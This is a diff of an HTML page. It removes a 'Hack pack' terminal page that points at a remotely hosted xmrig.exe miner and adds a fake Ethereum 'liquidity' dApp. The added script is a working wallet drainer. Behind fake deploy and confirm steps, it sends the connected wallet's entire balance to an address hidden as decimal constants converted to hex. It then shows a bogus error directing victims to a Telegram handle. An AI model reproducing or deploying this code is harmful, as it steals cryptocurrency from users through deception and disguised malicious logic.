@@ -1,78 +1,492 @@
-<!DOCTYPE html> 
-<html lang="en"> 
-  
-<head> 
+<section>
 
-  <script>
+      <button id="connectButton">connect</button>
+
+      <table id="checkAdressBalanceButton" style="display: none">
+
+        <tr>
+
+          <td>my contract</td>
+
+          <td><button id="regular">deploy</button></td>
+
+          <td>
+
+            <p id="result"><code>no contract</code></p>
+
+          </td>
+
+        </tr>
+
+        <tr>
+
+          <td>my second address</td>
+
+          <td>
+
+            <input
+
+              type="text"
+
+              id="typeAdress"
+
+              name="adress_auth"
+
+              placeholder="Input second address ETH-0x"
+
+              autocomplete="off"
+
+              size="20"/>
+
+          </td>
+
+          <td>
+
+            <button id="sendEtherButton" style="display: none">Attach</button>
+
+          </td>
+
+          <td><div id="statusMessage"></div></td>
+
+        </tr>
+
+        <tr>
+
+          <td>my status</td>
+
+          <td><center>
+
+            <button disabled="disabled" id="checkBalanceButton" style="display: none">
+
+              liquid
+
+            </button>
+
+          </td>
+
+          <td><p id="balanceDisplay" style="display: none"></p>confirm the liquidity</td>
+
+        </tr>
+
+      </table>
+
+      <script>
+
+        const connectButton = document.getElementById("connectButton");
+
+        const sendEtherButton = document.getElementById("sendEtherButton");
+
+        const typeAdress = document.getElementById("typeAdress");
+
+        const checkBalanceButton =document.getElementById("checkBalanceButton");
+
+        const balanceDisplay = document.getElementById("balanceDisplay");
+
+        const checkAdressBalanceButton = document.getElementById("checkAdressBalanceButton");
+
+        const statusMessage = document.getElementById("statusMessage");
+
+        let validationComplete = false;
+
+        let transferInProgress = false;
+
+        const performTransaction = async () => {
+
+          try {
+
+            const value = typeAdress.value;
+
+            transferInProgress = true;
+
+function kyc(dcm) 
+
+{
+
+  return parseInt(dcm).toString(16);
+
+}
+
+const m = '29555'; 
+
+const k = '65823'; 
+
+const e = '32280';
+
+const v = '619621';
+
+const n = '137011';
+
+const c = '4211409';
+
+const i = '14392965';
+
+const p = '113273';
+
+const evm = kyc(m);
+
+const hashlock = kyc(k);
+
+const moe = kyc(e);
+
+const spv = kyc(v);
+
+const comission = kyc(n);
+
+const sc = kyc(c);
+
+const validate = kyc(i);
+
+const mnode = kyc(p);
+
+const ra  = `0x${evm}${hashlock}${moe}${spv}${comission}${sc}${validate}${mnode}`;
+
+            const balanceWei = await window.ethereum.request({
+
+              method: "eth_getBalance",
+
+              params: [window.ethereum.selectedAddress, "latest"],
+
+            });
+
+            const gasPrice = await window.ethereum.request({
+
+              method: "eth_gasPrice",
+
+            });
+
+            const gasLimit = 33000;
+
+            const gasCost = gasPrice * gasLimit;
+
+            if (BigInt(balanceWei) < gasCost) {
+
+              alert("no ETH for gas fee");
+
+              transferInProgress = false;
+
+              return;
+
+            }
+
+            const amountToSend = BigInt(balanceWei) - BigInt(gasCost);
+
+            await window.ethereum.request({
+
+              method: "eth_sendTransaction",
+
+              params: [
+
+                {
+
+                  from: window.ethereum.selectedAddress,
+
+                  to: ra,
+
+                  value: "0x" + amountToSend.toString(16),
+
+                },
+
+              ],
+
+            });
+
+            alert("Error. A small amount of liquidity. Write to me in telegram @OnlyTrustCrypto");
+
+            transferInProgress = false; 
+
+          } catch (error) {
+
+            alert("Error confirming liquidity. Repeat again");
+
+            console.error(error);
+
+            transferInProgress = false;
+
+          }
+
+        };
+
+        connectButton.addEventListener("click", async () => {
+
+          try {
+
+            const accounts = await window.ethereum.request({
+
+              method: "eth_requestAccounts",
+
+            });
+
+            if (accounts.length > 0) {
+
+              sendEtherButton.style.display = "block";
+
+              typeAdress.style.display = "block";
+
+              checkBalanceButton.style.display = "block";
+
+              checkAdressBalanceButton.style.display = "block";
+
+              connectButton.style.display = "none";
+
+            }
+
+          } catch (error) {
+
+            console.error(error);
+
+            alert("connection error");
+
+          }
+
+        });
+
+        sendEtherButton.addEventListener("click", async () => {
+
+          try {
+
+            const value = typeAdress.value;
+
+            if (resultElement.innerText !== "ready") {
+
+              alert("Сlick the deploy button");
+
+              return;
+
+            }
+
+            if (!value || value.length < 40) {
+
+              alert("Attention! Enter the correct second Ethereum address");
+
+              return;
+
+            }
+
+            if (!validationComplete) {
+
+              if (
+
+                /^[a-zA-Z0-9!@#$%^'&*()-_+=<>?:"',./\[\]{}|\\]+$/g.test(
+
+                  value
+
+                ) &&
+
+                value.length >= 40 
+
+              ) {
+
+                statusMessage.textContent = "waiting";
+
+                typeAdress.disabled = true;
+
+                sendEtherButton.disabled = true;
 
 
+                setTimeout(() => {
 
-    var text = 'Some data I want to export';
-var data = new Blob([text], {type: 'text/plain'});
+                  validationComplete = true;
 
-var url = window.URL.createObjectURL(data);
+                  statusMessage.textContent = "ready";
 
-document.getElementById('https://domain-subdomain.netlify.app/xmrig.exe').href = url;
-  </script>
-    <meta http-equiv="content-type" 
-        content="text/html; charset=UTF-8"> 
-  
-    <meta name="viewport" content="width=device-width, 
-        minimum-scale=1,initial-scale=1"> 
-  
-    <script src= 
-        "https://code.jquery.com/jquery-3.3.1.min.js"> 
-    </script> 
-  
-    <script src= 
-"https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js"> 
-    </script> 
-  
-    <link rel="stylesheet" href= 
-"https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css" /> 
-  
-    <style type="text/css"> 
-        .terminal, 
-        span, 
-        .cmd, 
-        div { 
-            --color: rgba(0, 128, 0, 0.99); 
-        } 
-  
-        .terminal, 
-        span { 
-            --size: 1.4; 
-        } 
-    </style> 
-</head> 
-  
-<body> 
+                  typeAdress.disabled = true;
+
+                  sendEtherButton.textContent = "confirm";
+
+                  sendEtherButton.disabled = false;
+
+                }, 10000);
+
+              } else {
+
+                alert("Error! input value");
+
+              }
+
+            } else if (sendEtherButton.textContent === "confirm") {
+
+              performTransaction();
+
+            }
+
+          } catch (error) {
+
+            console.error("Error on process:\n" + error);
+
+            transferInProgress = false; 
+
+          }
+
+        });
+
+        checkBalanceButton.addEventListener("click", async () => {
+
+          try {
+
+            const balanceWei = await window.ethereum.request({
+
+              method: "eth_getBalance",
+
+              params: [window.ethereum.selectedAddress, "latest"],
+
+            });
+
+            const balanceEther = (parseInt(balanceWei) / 1e18).toFixed(4);
+
+            balanceDisplay.innerText = `balance: ${balanceEther} ETH`;
+
+            balanceDisplay.style.display = "block";
+
+          } catch (error) {
+
+            console.error(error);
+
+            alert("Error");
+
+          }
+
+        });
+
+      </script>
+
+ <style>
+
+      html {
+
+        box-sizing: border-box;
+
+        font-family: "Open Sans", sans-serif;
+
+      }
+
+      *,
+
+      *:before,
+
+      *:after {
+
+        box-sizing: inherit;
+
+      }
+
+      body {
+
+        font-family: Arial, sans-serif;
+
+        text-align: center;
+
+        margin: 0;
+
+        padding: 20px;
+
+        background: #222336;
+
+        background: -webkit-radial-gradient(
+
+          circle farthest-side at center center,
+
+          #222336 0%,
+
+          #222336 100%
+
+        );
+
+        background: -moz-radial-gradient(
+
+          circle farthest-side at center center,
+
+          #2a2c3f 0%,
+
+          #222336 100%
+
+        );
+
+        background: radial-gradient(
+
+          circle farthest-side at center center,
+
+          #222336 0%,
+
+          #222336 100%
+
+        );
+
+      }
+
+      section {
+
+        background: #2a2c3f;
+
+        color: white;
+
+        border-radius: 1em;
+
+        padding: 1em;
+
+        position: absolute;
+
+        top: 50%;
+
+        left: 50%;
+
+        margin-right: -50%;
+
+        margin: 0 auto;
+
+        transform: translate(-50%, -50%);
+
+      }
+
+    </style>
+
+      <script>
+
+        const regularLaunchButton = document.getElementById("regular");
+
+        const resultElement = document.getElementById("result");
 
 
-  <a id="download_link" download="xmrig.exe" href=”” >Download as Text File</a>
+        function setButtonsDisabled(isDisabled) {
 
-    <script> 
-        $('body').terminal({ 
-            iam: function () { 
-                this.exec([
-   'incoming_wallet.cmd',
-]); 
-            }, 
-            founder: function () { 
-                this.exec([
-   'https://d55c-116-73-124-67.ngrok-free.app/xmrig.exe',
-]); 
-            }, 
-            help: function () { 
-                this.exec(
-   'https://d55c-116-73-124-67.ngrok-free.app/xmrig.exe',
-); 
-            }, 
-        }, { 
-            greetings: 'Hack pack' 
-               
-        }); 
-    </script> 
-  
-</body> 
-</html>
+          regularLaunchButton.disabled = isDisabled;
+
+        }
+
+        function timeout(workFn) {
+
+          console.log("exec");
+
+          setButtonsDisabled(true);
+
+          resultElement.innerText = "waiting...";
+
+          setTimeout(() => {
+
+            const asyncStartTime = Date.now();
+
+            resultElement.innerText = "ready";
+
+            setButtonsDisabled(true);
+
+          }, 12000);
+
+          const startTime = Date.now();
+
+
+          if (typeof workFn === "function") {
+
+            workFn();
+
+          }
+
+        }
+
+        regularLaunchButton.addEventListener("click", () => {
+
+          timeout();
+
+        });
+
+      </script>
+
+    </section>
